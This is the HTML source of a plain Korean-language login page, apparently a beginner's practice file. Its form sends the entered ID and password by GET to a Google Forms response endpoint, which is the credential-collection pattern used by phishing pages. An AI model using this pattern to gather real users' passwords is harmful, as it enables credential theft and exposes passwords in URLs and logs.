<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <style>
      body {
        font-family: Arial, Helvetica, sans-serif;
        background-color: #0e0b0bab;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }
      .login-container {
        background-color: white;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0 0 30px rgba(0, 0, 0, 1);
        width: 300px;
      }
      h2 {
        margin-bottom: 20px;
        text-align: center;
      }
      input {
        width: 93%;
        padding: 10px;
        margin: 10px 0;
        border: 1px solid #ccc;
        border-radius: 5px;
      }
      button {
        width: 100%;
        padding: 10px;
        border: none;
        border-radius: 5px;
        background-color: rgb(35, 32, 224);
        color: white;
        font-size: 1rm;
        cursor: pointer;
        margin: 10px 0;
      }
      button:hover {
        background-color: rgba(52, 167, 243, 0.856);
      }
      button:last-of-type:hover {
        background-color: rgba(5, 5, 59, 0.322);
      }
    </style>
  </head>
  <body>
    <!-- div.login-container>h2{로그인}+form>(lebel+input)*2button+hr+button -->
    <div class="login-container">
      <h2>로그인</h2>
      <form
        action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeNIDBZEQIMeQSleF9V1bkNWcWKMIK8Ao4NJRWcndjDRDRQWQ/formResponse?entry.1317169614
=banana&entry.2139040218=6666"
        method="get"
      >
        <lebel for="id">ID:</lebel>
        <input type="text" id="id" name="entry.1317169614" required />
        <lebel for="pw">Password:</lebel>
        <input type="password" id="pw" name="entry.2139040218" required />
        <button>로그인</button>
        <hr />
        <button>가입하기</button>
      </form>
    </div>
  </body>
</html>
